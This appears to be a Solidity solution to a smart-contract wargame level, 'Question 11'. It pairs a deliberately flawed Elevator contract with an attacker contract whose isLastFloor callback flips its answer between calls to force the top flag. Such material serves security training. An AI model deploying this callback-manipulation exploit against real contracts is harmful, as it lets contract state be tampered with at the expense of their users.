// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Question 11
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Solution11 is Building {
    mapping(uint256 => bool) _isLastFloor;

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool res = _isLastFloor[_floor];
        _isLastFloor[_floor] = !_isLastFloor[_floor];
        return res;
    }

    function hack(address _target, uint256 _floor) public {
        Elevator(_target).goTo(_floor);
    }
}